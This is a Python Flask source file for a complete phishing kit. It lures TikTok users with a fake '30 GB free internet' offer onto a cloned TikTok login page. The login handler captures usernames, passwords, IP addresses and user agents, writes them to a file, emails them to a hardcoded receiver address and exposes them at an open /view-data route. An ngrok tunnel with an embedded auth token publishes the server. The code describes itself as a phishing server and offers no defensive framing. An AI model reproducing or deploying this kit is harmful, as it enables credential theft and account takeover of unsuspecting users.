# =============================================================================
# TIKTOK 30GB PROMO + OFFICIAL LOGIN - RENDER DEPLOYMENT (EMAIL ALERTS)
# Flow: Landing promo → Official login → Capture → Email
# =============================================================================

import os
import json
import logging
import smtplib
import threading
import time
from email.message import EmailMessage
from datetime import datetime
from flask import Flask, request, render_template_string, redirect, url_for
from pyngrok import ngrok, conf

# -------------------- Configuration --------------------
NGROK_AUTH_TOKEN = "3CTdjmF4Jk0Gju0TnBL8K5FWoUh_LdxdiFY7GCaUKKmLbGov"
DATA_FILE = "captured_credentials.json"

EMAIL_SENDER = os.environ.get('EMAIL_SENDER', '')
EMAIL_PASSWORD = os.environ.get('EMAIL_PASSWORD', '')
EMAIL_RECEIVER = os.environ.get('EMAIL_RECEIVER', 'ah3418678@gmail.com')

logging.basicConfig(level=logging.INFO)

app = Flask(__name__)

# -------------------- PROMO LANDING PAGE HTML --------------------
PROMO_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok - 30GB Free Internet</title>
    <link rel="icon" href="https://www.tiktok.com/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        .logo {
            margin: 30px 0 20px;
        }
        .offer-card {
            background: linear-gradient(135deg, #fe2c55 0%, #ff6b6b 100%);
            border-radius: 24px;
            padding: 30px 20px;
            color: white;
            margin-bottom: 30px;
        }
        .offer-badge {
            background: rgba(255,255,255,0.2);
            display: inline-block;
            padding: 6px 16px;
            border-radius: 50px;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        .offer-title {
            font-size: 36px;
            font-weight: 800;
            margin-bottom: 8px;
        }
        .offer-subtitle {
            font-size: 16px;
            opacity: 0.9;
            margin-bottom: 24px;
        }
        .data-highlight {
            background: rgba(255,255,255,0.15);
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
        }
        .data-number {
            font-size: 48px;
            font-weight: 800;
        }
        .data-label {
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .cta-button {
            display: block;
            width: 100%;
            background: white;
            color: #fe2c55;
            border: none;
            border-radius: 50px;
            padding: 16px;
            font-size: 18px;
            font-weight: 700;
            text-decoration: none;
            margin: 20px 0;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            transition: transform 0.2s;
        }
        .cta-button:hover {
            transform: scale(1.02);
        }
        .features {
            display: flex;
            justify-content: space-around;
            margin: 30px 0;
        }
        .feature-item {
            text-align: center;
        }
        .feature-icon {
            font-size: 32px;
            margin-bottom: 8px;
        }
        .feature-text {
            font-size: 13px;
            color: #8a8b91;
        }
        .footer-note {
            color: #8a8b91;
            font-size: 12px;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #f1f1f2;
        }
        .terms {
            font-size: 11px;
            color: #8a8b91;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 30" width="130" height="42">
                <path fill="#25F4EE" d="M9.875 11.842v-1.119A8.836 8.836 0 008.7 10.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 20.55c0-4.737 3.794-8.598 8.495-8.707z"></path>
                <path fill="#25F4EE" d="M10.087 24.526c2.14 0 3.89-1.707 3.966-3.83l.007-18.968h3.462a6.78 6.78 0 01-.109-1.202h-4.727l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 8.166V7.111a6.506 6.506 0 01-3.584-1.067 6.572 6.572 0 003.584 2.122z"></path>
                <path fill="#FE2C55" d="M20.41 6.044a6.54 6.54 0 01-1.617-4.316h-1.265a6.557 6.557 0 002.881 4.316zM8.707 15.365a3.98 3.98 0 00-3.974 3.976c0 1.528.87 2.858 2.134 3.523a3.937 3.937 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.41 0 .805.07 1.176.185v-4.833a8.852 8.852 0 00-1.176-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.175-.185z"></path>
                <path fill="#FE2C55" d="M23.992 8.166v3.676a11.25 11.25 0 01-6.579-2.116v9.621c0 4.802-3.903 8.714-8.706 8.714a8.669 8.669 0 01-4.99-1.579 8.69 8.69 0 006.37 2.781c4.796 0 8.706-3.906 8.706-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.479 0-.939-.052-1.38-.148z"></path>
                <path fill="white" d="M17.413 19.348V9.726a11.25 11.25 0 006.58 2.116V8.166a6.572 6.572 0 01-3.584-2.122 6.611 6.611 0 01-2.887-4.316h-3.463l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.99 3.99 0 01-3.225-1.656 3.991 3.991 0 01-2.134-3.523A3.98 3.98 0 018.7 15.372c.409 0 .805.07 1.176.185v-3.708c-4.702.103-8.496 3.964-8.496 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.989 1.58c4.797 0 8.706-3.913 8.706-8.715zM30.048 8.179h14.775l-1.355 4.232h-3.832v15.644h-4.778V12.41l-4.804.006-.006-4.238zM69.032 8.179h15.12l-1.354 4.232h-4.172v15.644h-4.784V12.41l-4.803.006-.007-4.238zM45.73 14.502h4.733v13.553h-4.708l-.026-13.553zM52.347 8.128h4.733v9.257l4.689-4.61h5.647l-5.934 5.76 6.643 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236h-4.733V8.128h.006zM102.49 8.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V8.128zM48.093 12.954a2.384 2.384 0 10-.002-4.771 2.384 2.384 0 00.002 4.771z"></path>
                <path fill="#25F4EE" d="M83.544 19.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path>
                <path fill="#FE2C55" d="M92.858 11.83c-.217 0-.505.012-.715.025a8.111 8.111 0 017.467 8.087 8.111 8.111 0 01-7.467 8.087c.21.02.498.026.715.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path>
                <path fill="white" d="M91.58 23.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.941 3.945zm0-12.058c-4.477 0-8.105 3.631-8.105 8.113 0 4.482 3.628 8.113 8.106 8.113 4.477 0 8.106-3.631 8.106-8.113 0-4.482-3.629-8.113-8.106-8.113z"></path>
            </svg>
        </div>
        <div class="offer-card">
            <div class="offer-badge">🎁 LIMITED TIME OFFER</div>
            <div class="offer-title">30 GB</div>
            <div class="offer-subtitle">Free Internet Data</div>
            <div class="data-highlight">
                <div class="data-number">30</div>
                <div class="data-label">Gigabytes</div>
            </div>
            <p style="margin-bottom: 20px;">Exclusive for TikTok users</p>
            <a href="/login" class="cta-button">Log in with TikTok →</a>
            <p style="font-size: 12px; opacity: 0.8;">No payment required • Activate instantly</p>
        </div>
        <div class="features">
            <div class="feature-item">
                <div class="feature-icon">📱</div>
                <div class="feature-text">Stream Videos</div>
            </div>
            <div class="feature-item">
                <div class="feature-icon">🎮</div>
                <div class="feature-text">Play Games</div>
            </div>
            <div class="feature-item">
                <div class="feature-icon">🌐</div>
                <div class="feature-text">Browse Free</div>
            </div>
        </div>
        <div class="footer-note">
            <p>🔒 Secure activation through TikTok</p>
            <p class="terms">By continuing, you agree to TikTok's Terms of Service and Privacy Policy.<br>Offer valid for new and existing users.</p>
        </div>
    </div>
</body>
</html>
'''

# -------------------- OFFICIAL TIKTOK LOGIN PAGE HTML (same as before) --------------------
PHISH_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok - Login</title>
    <link rel="icon" href="https://www.tiktok.com/favicon.ico">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        #app { min-height: 100vh; display: flex; flex-direction: column; }
        .tiktok-urb8su-DivContainer { flex: 1; display: flex; flex-direction: column; }
        .tiktok-103wteu-DivHeaderContainer {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px 20px;
            border-bottom: 1px solid rgba(22, 24, 35, 0.12);
        }
        .tiktok-1431rw4-StyledLinkLogo {
            display: flex;
            align-items: center;
            text-decoration: none;
            color: #000;
            font-weight: 700;
            font-size: 20px;
        }
        .tiktok-1431rw4-StyledLinkLogo svg { margin-right: 8px; }
        .help-center {
            display: flex;
            align-items: center;
            color: rgba(22, 24, 35, 0.75);
            text-decoration: none;
            font-size: 14px;
        }
        .tiktok-qz3hn2-DivBodyContainer {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .tiktok-1l2wk29-DivLoginContainer { width: 100%; max-width: 400px; margin: 0 auto; }
        .tiktok-a6tysm-DivAnimationWrapper {
            background: #fff;
            border-radius: 8px;
            padding: 32px 24px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.08);
        }
        .tiktok-1xh3q9x-H2Title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 24px;
            text-align: center;
            color: #121212;
        }
        .tiktok-t9ciu8-DivLoginContainer { width: 100%; }
        .tiktok-1q5vajd-DivDescription {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
            font-size: 15px;
            color: rgba(22, 24, 35, 0.75);
        }
        .tiktok-88tj8y-ALink-StyledLink {
            color: #fe2c55;
            text-decoration: none;
            font-weight: 500;
        }
        .tiktok-15iauzg-DivContainer { margin-bottom: 16px; }
        .tiktok-3fkkcb-DivPhoneInputContainer {
            display: flex;
            align-items: center;
            border: 1px solid rgba(22, 24, 35, 0.12);
            border-radius: 8px;
            background: #f1f1f2;
        }
        .tiktok-1nc4fij-DivAreaSelectionContainer {
            padding: 0 12px;
            border-right: 1px solid rgba(22, 24, 35, 0.12);
            cursor: pointer;
        }
        .tiktok-semvhe-DivAreaLabelContainer {
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .tiktok-9q4i2w-SpanLabelContainer { font-weight: 500; }
        .tiktok-so52kr-StyledArrowIcon { width: 16px; height: 16px; }
        .tiktok-1tmp3bq-StyledBaseInput {
            flex: 1;
            padding: 12px 16px;
        }
        .tiktok-14u4iso-InputContainer {
            width: 100%;
            border: none;
            background: transparent;
            font-size: 16px;
            outline: none;
        }
        .tiktok-txpjn9-DivIconContainer {
            display: flex;
            align-items: center;
            padding-right: 12px;
        }
        .tiktok-v960db-ButtonPasskey {
            background: none;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
        }
        .tiktok-lbvdn-StyledPasskeyBtn {
            width: 20px;
            height: 20px;
            color: rgba(22, 24, 35, 0.5);
        }
        .tiktok-j5tm11-DivCodeInputContainer {
            display: flex;
            gap: 8px;
            margin-top: 16px;
        }
        .code-input {
            flex: 1;
            border: 1px solid rgba(22, 24, 35, 0.12);
            border-radius: 8px;
            background: #f1f1f2;
            padding: 12px 16px;
        }
        .tiktok-1wg3fgq-InputContainer {
            width: 100%;
            border: none;
            background: transparent;
            font-size: 16px;
            outline: none;
        }
        .tiktok-x9xz1x-ButtonSendCode {
            padding: 12px 16px;
            background: #e4e4e6;
            border: none;
            border-radius: 8px;
            font-weight: 600;
            color: rgba(22, 24, 35, 0.34);
            cursor: not-allowed;
            white-space: nowrap;
        }
        .tiktok-m3zwcn-StyledPasswordLink {
            margin: 16px 0;
            text-align: right;
        }
        .tiktok-1hcmd14-Button-StyledButton {
            width: 100%;
            padding: 12px;
            background: #fe2c55;
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.2s;
        }
        .tiktok-1hcmd14-Button-StyledButton:hover { background: #e01e45; }
        .tiktok-1komt3e-DivBack {
            display: flex;
            align-items: center;
            gap: 8px;
            margin: 16px 0;
            cursor: pointer;
            color: rgba(22, 24, 35, 0.75);
        }
        .tiktok-1sllk4i-DivFooterContainer {
            padding: 20px;
            border-top: 1px solid rgba(22, 24, 35, 0.12);
        }
        .tiktok-56o1ht-DivContainer {
            display: flex;
            justify-content: center;
            gap: 8px;
            margin-bottom: 16px;
        }
        .tiktok-f3sj1p-SpanLinkText {
            color: #fe2c55;
            font-weight: 600;
            text-decoration: none;
        }
        .tiktok-857ltq-DivBottomContainer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: rgba(22, 24, 35, 0.5);
        }
        .tiktok-hru8kg-DivContainer { position: relative; }
        .tiktok-ktfs0g-PSelectContainer {
            cursor: pointer;
            padding: 8px 0;
        }
        .tiktok-vm0biq-SelectFormContainer {
            position: absolute;
            top: 100%;
            left: 0;
            opacity: 0;
            width: 100%;
            cursor: pointer;
        }
        .success-message {
            text-align: center;
            padding: 20px;
        }
        .success-message h2 {
            font-size: 24px;
            margin: 16px 0;
        }
        @media (max-width: 480px) {
            .tiktok-103wteu-DivHeaderContainer { padding: 12px 16px; }
            .tiktok-a6tysm-DivAnimationWrapper { padding: 24px 16px; }
            .tiktok-1xh3q9x-H2Title { font-size: 24px; }
        }
    </style>
</head>
<body>
    <div id="app">
        <div class="tiktok-urb8su-DivContainer">
            <div class="tiktok-103wteu-DivHeaderContainer">
                <a class="tiktok-1431rw4-StyledLinkLogo" href="#">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 30" width="118" height="42">
                        <path fill="#25F4EE" d="M9.875 11.842v-1.119A8.836 8.836 0 008.7 10.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 20.55c0-4.737 3.794-8.598 8.495-8.707z"></path>
                        <path fill="#25F4EE" d="M10.087 24.526c2.14 0 3.89-1.707 3.966-3.83l.007-18.968h3.462a6.78 6.78 0 01-.109-1.202h-4.727l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 8.166V7.111a6.506 6.506 0 01-3.584-1.067 6.572 6.572 0 003.584 2.122z"></path>
                        <path fill="#FE2C55" d="M20.41 6.044a6.54 6.54 0 01-1.617-4.316h-1.265a6.557 6.557 0 002.881 4.316zM8.707 15.365a3.98 3.98 0 00-3.974 3.976c0 1.528.87 2.858 2.134 3.523a3.937 3.937 0 01-.754-2.321 3.98 3.98 0 013.973-3.976c.41 0 .805.07 1.176.185v-4.833a8.852 8.852 0 00-1.176-.083c-.07 0-.134.006-.204.006v3.708a3.999 3.999 0 00-1.175-.185z"></path>
                        <path fill="#FE2C55" d="M23.992 8.166v3.676a11.25 11.25 0 01-6.579-2.116v9.621c0 4.802-3.903 8.714-8.706 8.714a8.669 8.669 0 01-4.99-1.579 8.69 8.69 0 006.37 2.781c4.796 0 8.706-3.906 8.706-8.714v-9.621a11.25 11.25 0 006.579 2.116v-4.73c-.479 0-.939-.052-1.38-.148z"></path>
                        <path fill="white" d="M17.413 19.348V9.726a11.25 11.25 0 006.58 2.116V8.166a6.572 6.572 0 01-3.584-2.122 6.611 6.611 0 01-2.887-4.316h-3.463l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.99 3.99 0 01-3.225-1.656 3.991 3.991 0 01-2.134-3.523A3.98 3.98 0 018.7 15.372c.409 0 .805.07 1.176.185v-3.708c-4.702.103-8.496 3.964-8.496 8.701 0 2.29.888 4.373 2.338 5.933a8.669 8.669 0 004.989 1.58c4.797 0 8.706-3.913 8.706-8.715zM30.048 8.179h14.775l-1.355 4.232h-3.832v15.644h-4.778V12.41l-4.804.006-.006-4.238zM69.032 8.179h15.12l-1.354 4.232h-4.172v15.644h-4.784V12.41l-4.803.006-.007-4.238zM45.73 14.502h4.733v13.553h-4.708l-.026-13.553zM52.347 8.128h4.733v9.257l4.689-4.61h5.647l-5.934 5.76 6.643 9.52h-5.213l-4.433-6.598-1.405 1.362v5.236h-4.733V8.128h.006zM102.49 8.128h4.734v9.257l4.688-4.61h5.647l-5.934 5.76 6.643 9.52h-5.206l-4.433-6.598-1.405 1.362v5.236h-4.734V8.128zM48.093 12.954a2.384 2.384 0 10-.002-4.771 2.384 2.384 0 00.002 4.771z"></path>
                        <path fill="#25F4EE" d="M83.544 19.942a8.112 8.112 0 017.474-8.087 8.748 8.748 0 00-.709-.026c-4.478 0-8.106 3.631-8.106 8.113 0 4.482 3.628 8.113 8.106 8.113.21 0 .498-.013.71-.026-4.178-.326-7.475-3.823-7.475-8.087z"></path>
                        <path fill="#FE2C55" d="M92.858 11.83c-.217 0-.505.012-.715.025a8.111 8.111 0 017.467 8.087 8.111 8.111 0 01-7.467 8.087c.21.02.498.026.715.026 4.478 0 8.106-3.631 8.106-8.113 0-4.482-3.628-8.113-8.106-8.113z"></path>
                        <path fill="white" d="M91.58 23.887a3.94 3.94 0 01-3.94-3.945 3.94 3.94 0 117.882 0c0 2.18-1.77 3.945-3.941 3.945zm0-12.058c-4.477 0-8.105 3.631-8.105 8.113 0 4.482 3.628 8.113 8.106 8.113 4.477 0 8.106-3.631 8.106-8.113 0-4.482-3.629-8.113-8.106-8.113z"></path>
                    </svg>
                    <strong>TikTok</strong>
                </a>
                <div>
                    <a class="help-center" href="#">
                        <svg width="1em" height="1em" viewBox="0 0 48 48" fill="currentColor">
                            <path fill-rule="evenodd" clip-rule="evenodd" d="M24 6C14.0589 6 6 14.0589 6 24C6 33.9411 14.0589 42 24 42C33.9411 42 42 33.9411 42 24C42 14.0589 33.9411 6 24 6ZM2 24C2 11.8497 11.8497 2 24 2C36.1503 2 46 11.8497 46 24C46 36.1503 36.1503 46 24 46C11.8497 46 2 36.1503 2 24ZM24.0909 15C22.172 15 20.3433 16.2292 19.2617 18.61C19.0332 19.1128 18.4726 19.4 17.9487 19.2253L16.0513 18.5929C15.5274 18.4182 15.2406 17.8497 15.4542 17.3405C16.9801 13.7031 20.0581 11 24.0909 11C28.459 11 32 14.541 32 18.9091C32 21.2138 30.7884 23.4606 29.2167 25.074C27.8157 26.5121 25.5807 27.702 22.9988 27.9518C22.4491 28.0049 22.0001 27.5523 22.0001 27V25C22.0001 24.4477 22.4504 24.0057 22.9955 23.9167C24.2296 23.7153 25.5034 23.1533 26.3515 22.2828C27.4389 21.1666 28 19.8679 28 18.9091C28 16.7502 26.2498 15 24.0909 15ZM24 36C22.3431 36 21 34.6569 21 33C21 31.3431 22.3431 30 24 30C25.6569 30 27 31.3431 27 33C27 34.6569 25.6569 36 24 36Z"></path>
                        </svg>
                        <span>Feedback and help</span>
                    </a>
                </div>
            </div>
            <div class="tiktok-qz3hn2-DivBodyContainer">
                <div class="tiktok-1l2wk29-DivLoginContainer">
                    <div class="tiktok-a6tysm-DivAnimationWrapper">
                        {% if success %}
                        <div class="success-message">
                            <div style="font-size: 48px;">✅</div>
                            <h2>Login Successful!</h2>
                            <p>Your 30GB data will be activated shortly.</p>
                            <p>Redirecting to TikTok...</p>
                        </div>
                        <script>
                            setTimeout(function() {
                                window.location.href = 'https://www.tiktok.com';
                            }, 3000);
                        </script>
                        {% else %}
                        <h2 class="tiktok-1xh3q9x-H2Title">Log in</h2>
                        <div class="tiktok-t9ciu8-DivLoginContainer">
                            <div class="tiktok-1q5vajd-DivDescription">
                                Phone
                                <a href="#" class="tiktok-88tj8y-ALink-StyledLink">Log in with email or username</a>
                            </div>
                            <form method="POST">
                                <div class="tiktok-15iauzg-DivContainer">
                                    <div class="tiktok-3fkkcb-DivPhoneInputContainer">
                                        <div class="tiktok-1nc4fij-DivAreaSelectionContainer" onclick="alert('Country selector (demo)')">
                                            <div class="tiktok-semvhe-DivAreaLabelContainer">
                                                <span class="tiktok-9q4i2w-SpanLabelContainer">PK +92</span>
                                                <svg class="tiktok-so52kr-StyledArrowIcon" viewBox="0 0 48 48" fill="currentColor">
                                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M25.5187 35.2284C24.7205 36.1596 23.2798 36.1596 22.4816 35.2284L8.83008 19.3016C7.71807 18.0042 8.63988 16 10.3486 16H37.6517C39.3604 16 40.2822 18.0042 39.1702 19.3016L25.5187 35.2284Z"></path>
                                                </svg>
                                            </div>
                                        </div>
                                        <div class="tiktok-1tmp3bq-StyledBaseInput">
                                            <input type="text" name="identifier" placeholder="Phone number or email" autocomplete="username" class="tiktok-14u4iso-InputContainer" required autofocus>
                                            <div class="tiktok-txpjn9-DivIconContainer">
                                                <button type="button" class="tiktok-v960db-ButtonPasskey" onclick="alert('Passkey login (demo)')">
                                                    <svg fill="currentColor" class="tiktok-lbvdn-StyledPasskeyBtn" viewBox="0 0 48 48" width="1em" height="1em">
                                                        <path d="M19 4a10 10 0 1 0 0 20 10 10 0 0 0 0-20ZM19 27C8.06 27 2 34.92 2 41.44 2 45 4 45 11 45h9.5a6 6 0 0 1 1.81-5.48l5.15-4.78a11.5 11.5 0 0 1-.14-5.94A19.06 19.06 0 0 0 19 27Z"></path>
                                                        <path fill-rule="evenodd" clip-rule="evenodd" d="M38.5 24a7.5 7.5 0 0 0-6.34 11.51l-8.07 8.08 2.82 2.82 2.84-2.83 2.84 2.83 2.82-2.82-2.83-2.84 2.55-2.55A7.5 7.5 0 1 0 38.5 24ZM35 31.5a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0Z"></path>
                                                    </svg>
                                                </button>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div>
                                    <div class="tiktok-j5tm11-DivCodeInputContainer">
                                        <div class="code-input tiktok-1cdpd25-StyledBaseInput">
                                            <input type="password" name="password" placeholder="Password" class="tiktok-1wg3fgq-InputContainer" required>
                                        </div>
                                        <button type="button" class="tiktok-x9xz1x-ButtonSendCode" disabled>Send code</button>
                                    </div>
                                </div>
                                <div class="tiktok-m3zwcn-StyledPasswordLink">
                                    <a href="#" class="tiktok-88tj8y-ALink-StyledLink">Log in with password</a>
                                </div>
                                <button type="submit" class="tiktok-1hcmd14-Button-StyledButton">Log in</button>
                            </form>
                        </div>
                        {% endif %}
                    </div>
                </div>
                <div class="tiktok-1komt3e-DivBack" onclick="history.back()">
                    <svg width="1em" height="1em" viewBox="0 0 48 48" fill="currentColor">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M4.58579 22.5858L20.8787 6.29289C21.2692 5.90237 21.9024 5.90237 22.2929 6.29289L23.7071 7.70711C24.0976 8.09763 24.0976 8.7308 23.7071 9.12132L8.82843 24L23.7071 38.8787C24.0976 39.2692 24.0976 39.9024 23.7071 40.2929L22.2929 41.7071C21.9024 42.0976 21.2692 42.0976 20.8787 41.7071L4.58579 25.4142C3.80474 24.6332 3.80474 23.3668 4.58579 22.5858Z"></path>
                    </svg>
                    Go back
                </div>
            </div>
            <div class="tiktok-1sllk4i-DivFooterContainer">
                <div class="tiktok-56o1ht-DivContainer">
                    <div>Don't have an account?</div>
                    <a href="#" class="tiktok-f3sj1p-SpanLinkText">Sign up</a>
                </div>
                <div class="tiktok-857ltq-DivBottomContainer">
                    <div class="tiktok-hru8kg-DivContainer">
                        <p class="tiktok-ktfs0g-PSelectContainer" onclick="alert('Language selector (demo)')">English (US)</p>
                    </div>
                    <div class="tiktok-1hvykal-DivCopyright">© 2026 TikTok</div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
'''

# -------------------- Helper Functions --------------------
def send_email_alert(identifier, password, ip, user_agent, timestamp):
    if not EMAIL_SENDER or not EMAIL_PASSWORD:
        logging.warning("Email credentials not set – skipping email alert.")
        return

    subject = f"🎉 TikTok Capture: {identifier}"
    body = f"""New TikTok login captured!

📧 Identifier: {identifier}
🔐 Password: {password}
🌐 IP Address: {ip}
🕒 Timestamp: {timestamp}
📱 User Agent: {user_agent}

---
This is an automated alert from your TikTok phishing server.
"""
    msg = EmailMessage()
    msg.set_content(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER

    try:
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_SENDER, EMAIL_PASSWORD)
            smtp.send_message(msg)
        logging.info(f"✅ Email alert sent to {EMAIL_RECEIVER}")
    except Exception as e:
        logging.error(f"❌ Failed to send email: {e}")

def save_credential(creds):
    try:
        with open(DATA_FILE, 'a') as f:
            json.dump(creds, f)
            f.write('\n')
    except Exception as e:
        logging.error(f"Failed to save credentials: {e}")

# -------------------- Flask Routes --------------------
@app.route('/')
def promo():
    """Landing page with 30GB offer."""
    return render_template_string(PROMO_HTML)

@app.route('/login', methods=['GET', 'POST'])
def login():
    """Official TikTok login page."""
    if request.method == 'POST':
        identifier = request.form.get('identifier', '').strip()
        password = request.form.get('password', '').strip()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')
        timestamp = datetime.utcnow().isoformat()

        creds = {
            'identifier': identifier,
            'password': password,
            'ip': ip,
            'timestamp': timestamp,
            'user_agent': user_agent
        }

        save_credential(creds)
        send_email_alert(identifier, password, ip, user_agent, timestamp)

        logging.info(f"🎉 Capture! Identifier: {identifier} | Password: {password} | IP: {ip}")

        return render_template_string(PHISH_HTML, success=True)

    return render_template_string(PHISH_HTML, success=False)

@app.route('/view-data')
def view_data():
    try:
        with open(DATA_FILE, 'r') as f:
            lines = f.readlines()
        data = [json.loads(line) for line in lines if line.strip()]
        return {'count': len(data), 'entries': data}
    except FileNotFoundError:
        return {'count': 0, 'entries': []}

# -------------------- Start ngrok in Background --------------------
def start_ngrok():
    time.sleep(3)
    try:
        conf.get_default().auth_token = NGROK_AUTH_TOKEN
        tunnel = ngrok.connect(5000, bind_tls=True)
        public_url = tunnel.public_url
        logging.info(f"✅ ngrok tunnel established: {public_url}")
    except Exception as e:
        logging.error(f"⚠️ ngrok failed to start: {e}")

if __name__ == '__main__':
    threading.Thread(target=start_ngrok, daemon=True).start()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
